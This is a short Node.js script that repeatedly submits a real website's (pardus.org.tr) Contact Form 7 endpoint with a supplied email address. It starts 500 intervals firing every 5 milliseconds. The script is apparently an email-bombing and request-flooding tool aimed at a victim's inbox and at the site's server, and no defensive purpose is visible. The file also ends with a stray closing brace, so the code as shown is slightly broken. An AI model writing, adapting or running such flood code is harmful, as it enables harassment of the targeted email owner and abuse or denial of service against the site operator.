const fetch = require("node-fetch")

module.exports = (email) => {
  for(let i = 0; i < 500; i++){
    setInterval(() => {
      fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
    "headers": {
      "accept": "application/json, */*;q=0.1",
      "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      "cache-control": "no-cache",
      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKiovsaJILejIAeqg",
      "pragma": "no-cache",
      "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin"
    },
    "referrer": "https://www.pardus.org.tr/en/home/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n18514\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.7.7\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f18514-p18505-o1\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n18505\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\n" + email + "\r\n------WebKitFormBoundaryKiovsaJILejIAeqg--\r\n",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  }).then(res => res.text()).then(data => console.log(data))
    },5)
}

}
